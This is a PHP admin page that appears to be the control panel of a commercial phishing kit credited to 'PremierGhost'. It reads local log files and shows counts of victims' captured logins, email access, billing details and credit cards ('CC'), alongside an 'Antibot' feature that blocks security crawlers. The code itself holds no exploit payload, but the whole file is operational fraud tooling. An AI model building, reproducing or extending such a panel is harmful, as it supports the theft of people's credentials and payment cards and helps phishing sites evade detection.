<?php

    session_start();

    if (
        !isset($_SESSION['login']) ||
        !$_SESSION['login']
    ) {
        die(header("Location: ./login.php"));
    }

    $userList = fopen("../Guard/Audio/live.txt", "r");
    $botList = fopen("../Guard/Audio/kill.txt", "r");

    $visitors = 0;
    $logins = 0;
    $email = 0;
    $billing = 0;
    $cc = 0;
    $bots = 0;

    while(($line = fgets($botList)) !== false) {
        $line = trim($line);
        if (preg_match("/IP/", $line)) {
            $bots++;
        }
    }

    while(($line = fgets($userList)) !== false) {
        $line = trim($line);
        if (preg_match("/Visitor/", $line)) {
            $visitors++;
        }
        if (preg_match("/Login/", $line)) {
            $logins++;
        }
        if (preg_match("/Email Access/", $line)) {
            $email++;
        }
        if (preg_match("/Billing/", $line)) {
            $billing++;
        }
        if (preg_match("/CC/", $line)) {
            $cc++;
        }
    }

?>

<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <title>Home</title>
        <link rel="stylesheet" href="./css/style.css">
        <link rel="stylesheet" href="./css/custom.css">
        <link rel="shortcut icon" href="./img/favicon.svg" type="image/x-icon">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark py-1 shadow-sm">
            <div class="container">
                <a class="navbar-brand" href="./">
                    <img class="logo-nav" src="./img/logo.svg" alt="">
                </a>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active">
                            <a class="nav-link" href="./">Home <i class="fad fa-house"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./antibot.php">Antibot <i class="fad fa-robot"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./settings.php">Settings <i class="fad fa-cog"></i></a>
                        </li>
                    </ul>
                    <ul class="navbar-nav ml-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="./jobs/reset.php?page=home">Reset Logs <i class="fad fa-trash-alt"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./jobs/logout.php">Logout <i class="fad fa-sign-out"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="container mt-4">
            <?php

                if (isset($_SESSION['success'])) {
                    echo '<div class="alert alert-danger shadow-sm fade show"><span>' . $_SESSION['success'] . '</span><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>';
                    unset($_SESSION['success']);
                }

            ?>
            <div class="row mt-3">
                <div class="col-xl-3 col-lg-4 col-md-5 col-sm-6 mt-4 mx-auto">
                    <div class="card rounded-0 shadow-sm">
                        <div class="card-body py-3">
                            <div class="row">
                                <div class="col-md-3 col-4 d-flex align-items-center">
                                    <i class="fa-3x fad fa-eye"></i>
                                </div>
                                <div class="col-md-9 col-8 d-flex flex-column justify-content-center align-items-end">
                                    <span class="h5 font-weight-normal m-0">Visitors</span>
                                    <br>
                                    <span class="h3 font-weight-normal m-0"><?php echo $visitors; ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-4 col-md-5 col-sm-6 mt-4 mx-auto">
                    <div class="card rounded-0 shadow-sm">
                        <div class="card-body py-3">
                            <div class="row">
                                <div class="col-md-3 col-4 d-flex align-items-center">
                                    <i class="fa-3x fad fa-lock"></i>
                                </div>
                                <div class="col-md-9 col-8 d-flex flex-column justify-content-center align-items-end">
                                    <span class="h5 font-weight-normal m-0">Logins</span>
                                    <br>
                                    <span class="h3 font-weight-normal m-0"><?php echo $logins; ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-4 col-md-5 col-sm-6 mt-4 mx-auto">
                    <div class="card rounded-0 shadow-sm">
                        <div class="card-body py-3">
                            <div class="row">
                                <div class="col-md-3 col-4 d-flex align-items-center">
                                    <i class="fa-3x fad fa-paper-plane"></i>
                                </div>
                                <div class="col-md-9 col-8 d-flex flex-column justify-content-center align-items-end">
                                    <span class="h5 font-weight-normal m-0">Email Access</span>
                                    <br>
                                    <span class="h3 font-weight-normal m-0"><?php echo $email; ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-4 col-md-5 col-sm-6 mt-4 mx-auto">
                    <div class="card rounded-0 shadow-sm">
                        <div class="card-body py-3">
                            <div class="row">
                                <div class="col-md-3 col-4 d-flex align-items-center">
                                    <i class="fa-3x fad fa-house"></i>
                                </div>
                                <div class="col-md-9 col-8 d-flex flex-column justify-content-center align-items-end">
                                    <span class="h5 font-weight-normal m-0">Billing</span>
                                    <br>
                                    <span class="h3 font-weight-normal m-0"><?php echo $billing; ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-4 col-md-5 col-sm-6 mt-4 mx-auto">
                    <div class="card rounded-0 shadow-sm">
                        <div class="card-body py-3">
                            <div class="row">
                                <div class="col-md-3 col-4 d-flex align-items-center">
                                    <i class="fa-3x fad fa-credit-card"></i>
                                </div>
                                <div class="col-md-9 col-8 d-flex flex-column justify-content-center align-items-end">
                                    <span class="h5 font-weight-normal m-0">CC</span>
                                    <br>
                                    <span class="h3 font-weight-normal m-0"><?php echo $cc; ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row d-sm-block d-none">
                <div class="col-lg-5 mt-4 mx-auto">
                    <div class="card rounded-0 shadow-sm">
                        <div class="card-body">
                            <div class="row">
                                <div class="col-5">
                                    <div class="row">
                                        <div class="col-sm-4 d-flex align-items-center">
                                            <i class="fa-3x fad fa-eye"></i>
                                        </div>
                                        <div class="col-sm-8">
                                            <span class="h5 font-weight-normal m-0">Visitors</span>
                                            <br>
                                            <span class="h3 font-weight-normal m-0"><?php echo $visitors; ?> / <?php echo $visitors + $bots; ?></span>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-2 d-flex justify-content-center align-items-center">
                                    <i class="fa-3x fad fa-ghost"></i>
                                </div>
                                <div class="col-5 text-right">
                                    <div class="row">
                                        <div class="col-sm-8">
                                            <span class="h5 font-weight-normal m-0">Bots</span>
                                            <br>
                                            <span class="h3 font-weight-normal m-0"><?php echo $bots; ?> / <?php echo $visitors + $bots; ?></span>
                                        </div>
                                        <div class="col-sm-4 d-flex align-items-center justify-content-end">
                                            <i class="fa-3x fad fa-user-robot"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="text-center my-5">
                <span class="small">
                    <span>Code written by PremierGhost, not for redistribution.</span>
                    <br>
                    <span>Support is not guaranteed if my work is resold.</span>
                    <br>
                    <span>Sincerely, <a class="text-danger" href="https://t.me/PremierGhost" target="_blank">P</a></span>
                </span>
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    </body>
</html>